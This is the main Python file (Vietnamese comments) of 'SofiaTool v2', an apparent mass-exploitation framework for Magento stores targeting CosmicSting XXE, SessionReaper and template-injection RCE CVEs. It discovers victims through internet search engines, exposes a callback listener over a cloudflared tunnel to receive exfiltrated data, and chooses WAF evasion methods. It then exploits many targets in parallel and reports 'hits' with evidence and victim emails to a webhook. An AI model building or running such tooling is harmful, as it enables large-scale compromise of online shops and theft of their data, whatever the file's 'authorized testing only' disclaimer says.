#!/usr/bin/env python3
"""SofiaTool v2 — Magento exploit framework (CosmicSting / SessionReaper /
template-filter RCE).

CLI điều phối 5 pha:
  PHA 1  discovery : search engine (fofa/zoomeye/censys/shodan) -> fingerprint
                     HOẶC đọc file -t -> scope_guard (--scope)
                     + httpx lấy version -> quy tắc chọn CVE cần scan
  PHA 2  tunnel    : listener nội bộ (:8000) + cloudflared quick-tunnel
  PHA 3  waf       : phát hiện WAF per-target -> chọn evasion_order
  PHA 4  exploit   : điều phối theo CVE/version:
                     - CVE-2024-34102 (<= 2.4.6-p1/2.4.5-p4/2.4.4-p6): env_hunter XXE
                     - CVE-2025-54236 SessionReaper (<= các ngưỡng 2.4.x)
                     - CVE-2022-24086/24087 (2.3.3-p1-2.3.7-p2, 2.4.0-2.4.3-p1)
  PHA 5  report    : report.json / hits.csv / evidence / webhook + dọn dẹp

CHỈ DÙNG CHO MỤC ĐÍCH KIỂM THỬ BẢO MẬT ĐƯỢC UỶ QUYỀN.
"""
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

from core import config
from core.listener import OOBListener
from core.logger import get_logger, load_report, save_report
from core.tunnel import TunnelManager
from discovery import engines, engines_free, fingerprint, version
from discovery.scope_guard import filter_hosts, allowed
from discovery.target_queue import TargetQueue, normalize
from exploit import cve_2022_24086, session_reaper
from exploit.env_hunter import run_target

log = get_logger()


def build_parser():
    p = argparse.ArgumentParser(
        prog="sofia",
        description="SofiaTool v2 — CVE-2024-34102 (CosmicSting) XXE framework",
        epilog="CHỈ dùng cho mục tiêu đã được uỷ quyền.",
    )
    src = p.add_mutually_exclusive_group(required=True)
    src.add_argument("--discover", action="store_true",
                     help="PHA 1: quét search-engine tìm Magento 2 rồi fingerprint")
    src.add_argument("-t", "--targets", metavar="FILE",
                     help="file chứa danh sách host/URL (1 dòng / target)")
    p.add_argument("-w", "--webhook", metavar="URL", default=None,
                   help="webhook Discord/Slack/plain để nhận thông báo hit")
    p.add_argument("--threads", type=int, default=20,
                   help="số luồng exploit song song (mặc định: 20)")
    p.add_argument("--wait", type=int, default=30,
                   help="timeout chờ OOB callback mỗi payload (giây, mặc định: 30)")
    p.add_argument("--timeout", type=int, default=15,
                   help="timeout HTTP mỗi request tới target (giây, mặc định: 15)")
    p.add_argument("--scope", metavar="SUFFIX[,SUFFIX...]", default=None,
                   help="whitelist domain (vd: example.com,vn) — chặn host ngoài scope")
    p.add_argument("--engines", metavar="LIST", default="urlscan,free",
                   help="engine discovery: fofa,zoomeye,censys,shodan (trả phí) "
                        "hoặc urlscan,free (miễn phí — mặc định)")
    p.add_argument("--seeds", metavar="DOMAIN[,DOMAIN...]", default=None,
                   help="domain hạt giống cho nguồn free (crt.sh/wayback/otx)")
    p.add_argument("--engine-size", type=int, default=100,
                   help="số kết quả mỗi engine (mặc định: 100)")
    p.add_argument("--max-targets", type=int, default=None,
                   help="giới hạn số target thực tế được exploit (0 = không giới hạn)")
    p.add_argument("--listener-port", type=int, default=8000,
                   help="cổng listener nội bộ (mặc định: 8000)")
    p.add_argument("--tunnel-url", metavar="URL", default=None,
                   help="ghi đè tunnel URL (vd đã có sẵn trycloudflare) — bỏ qua cloudflared")
    return p


# ------------------------------------------------------------------ PHA 1
def phase_discovery(args):
    """Quét search-engine -> fingerprint -> target_queue."""
    log.info("PHA 1: discovery qua %s", args.engines)
    enabled = [e.strip() for e in args.engines.split(",") if e.strip()]
    free_names = {e for e in enabled
                  if e == "free" or e in engines_free.ENGINES_FREE
                  or e in engines_free.SOURCES_SEED}
    paid = [e for e in enabled if e not in free_names]
    raw = engines.run_all(paid, size=args.engine_size) if paid else []
    if free_names:
        seeds = [s for s in (getattr(args, "seeds", None) or "").split(",")
                 if s.strip()]
        raw.extend(engines_free.run_free(seed_domains=seeds,
                                         size=args.engine_size))
    # lọc scope trước khi fingerprint (tiết kiệm request)
    kept_hosts = set(filter_hosts([h for h, _ in raw]))
    pairs = [(h, s) for h, s in raw if h in kept_hosts]
    log.info("sau scope_guard: %d/%d host", len(pairs), len(raw))

    q = TargetQueue()
    magento = 0
    for host, source in pairs:
        base, is_m, signals = fingerprint.fingerprint_host(host)
        if is_m:
            if _enrich_push(q, base, source):
                magento += 1
        else:
            log.debug("không phải Magento (hoặc chết): %s", base)
    log.info("PHA 1 xong: %d host là Magento 2", magento)
    return q


def _enrich_push(q, base, source):
    """httpx lấy version target -> tính CVE áp dụng -> push vào queue.

    Trả True nếu target được push (chưa dedup). Không xác định được
    version -> cves = toàn bộ (scan tất cả để không bỏ lỡ).
    """
    ver = version.fetch_version(base)
    cves = version.applicable_cves(ver)
    pushed = q.push(base, source, version=ver.text if ver else None,
                    cves=cves)
    if pushed:
        if ver:
            log.info("version %s: %s -> scan %s",
                     ver.text, base, ", ".join(cves) or "(không có)")
        else:
            log.info("version không rõ: %s -> scan toàn bộ CVE", base)
    return pushed


def phase_targets_file(args):
    """Đọc file -t -> scope_guard -> target_queue."""
    q = TargetQueue()
    try:
        with open(args.targets, encoding="utf-8") as f:
            hosts = [ln.strip() for ln in f if ln.strip() and not ln.lstrip().startswith("#")]
    except OSError as e:
        log.error("không đọc được file target: %s", e)
        sys.exit(2)
    hosts = filter_hosts(hosts)
    n = 0
    for h in hosts:
        if _enrich_push(q, h, "manual"):
            n += 1
    log.info("PHA 1 (file): %d target sau scope_guard", n)
    return q


# ------------------------------------------------------------------ PHA 2
def phase_tunnel(listener, args):
    """Khởi động listener + tunnel. Trả (tunnel_base, tunnel_mgr)."""
    listener.start()
    if args.tunnel_url:
        base = args.tunnel_url.rstrip("/")
        log.info("dùng tunnel URL ghi đè: %s", base)
        return base, None
    tunnel = TunnelManager(port=args.listener_port)
    base = tunnel.start()
    if not base:
        log.error("không lấy được tunnel URL (cloudflared) — dùng --tunnel-url")
        return None, tunnel
    return base, tunnel


# ------------------------------------------------------------------ PHA 3/4
def phase_exploit(q, listener, args):
    """Chạy run_target trên pool. Trả list kết quả."""
    targets = []
    while not q.empty():
        t = q.pop()
        if args.max_targets and len(targets) >= args.max_targets:
            break
        targets.append(t)
    log.info("PHA 3/4: exploit %d target với %d luồng, WAIT_CALLBACK=%ds",
             len(targets), args.threads, config.WAIT_CALLBACK)
    results = []
    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futs = {}
        for t in targets:
            cves = t.get("cves") or version.ALL_CVES
            # một target có thể thuộc nhiều CVE -> submit nhiều worker
            if "CVE-2024-34102" in cves:
                futs[pool.submit(run_target, t, listener)] = t
            if "CVE-2025-54236" in cves:
                futs[pool.submit(session_reaper.run_target, t)] = t
            if "CVE-2022-24086/24087" in cves:
                futs[pool.submit(cve_2022_24086.run_target, t)] = t
            if not cves:
                log.info("  skip %s (version %s: không CVE nào khớp)",
                         t["url"], t.get("version"))
        for fut in as_completed(futs):
            t = futs[fut]
            try:
                r = fut.result()
                results.append(r)
                if r.get("hit"):
                    log.info("*** HIT: %s [%s] -> %s", r["url"],
                             r.get("cve"), r.get("evidence_dir"))
            except Exception as e:  # bảo vệ pool, không để 1 target làm chết thread
                log.exception("[%s] worker crash", t["url"])
                results.append({"url": t["url"], "source": t.get("source"),
                                "cve": "CVE-2024-34102", "hit": False,
                                "error": f"worker: {e}"})
    return results


# ------------------------------------------------------------------ PHA 5
def phase_report(results):
    """Ghi summary vào report.json + in bảng kết quả."""
    hits = [r for r in results if r.get("hit")]
    data = load_report()
    data["summary"] = {
        "total": len(results),
        "hits": len(hits),
        "generated": data.get("generated"),
    }
    save_report(data)
    log.info("PHA 5: %d/%d target trúng, chi tiết trong report/report.json",
             len(hits), len(results))
    for r in sorted(results, key=lambda x: not x.get("hit")):
        if r.get("hit"):
            ev = (r.get("evidence_dir") or r.get("webroot")
                  or r.get("snippet") or r.get("victim_email") or "-")
            log.info("  HIT  %s  [%s]  %s", r["url"], r.get("cve"), ev)
        else:
            log.info("  miss %s  (%s)", r["url"], r.get("error") or "patched/not vuln")
    return hits


def main(argv=None):
    args = build_parser().parse_args(argv)
    config.configure(args)

    # ---------------- PHA 1
    if args.discover:
        q = phase_discovery(args)
    else:
        q = phase_targets_file(args)
    if len(q) == 0:
        log.error("không có target nào — dừng")
        sys.exit(1)

    # ---------------- PHA 2
    listener = OOBListener(port=args.listener_port)
    tunnel_base, tunnel = phase_tunnel(listener, args)
    if not tunnel_base:
        listener.stop()
        sys.exit(2)
    listener.set_tunnel_base(tunnel_base)
    log.info("tunnel_base = %s (listener %s:%d)", tunnel_base,
             config.LISTENER_HOST, args.listener_port)

    # ---------------- PHA 3/4/5
    results, hits = [], []
    try:
        results = phase_exploit(q, listener, args)
        hits = phase_report(results)
    except KeyboardInterrupt:
        log.warning("Ctrl-C — dọn dẹp và thoát")
        phase_report(results or [])
    finally:
        if tunnel:
            tunnel.stop()
        listener.stop()

    log.info("SofiaTool v2 kết thúc: %d hit / %d target. Evidence: evidence/",
             len(hits), len(results))
    sys.exit(0)


if __name__ == "__main__":
    main()






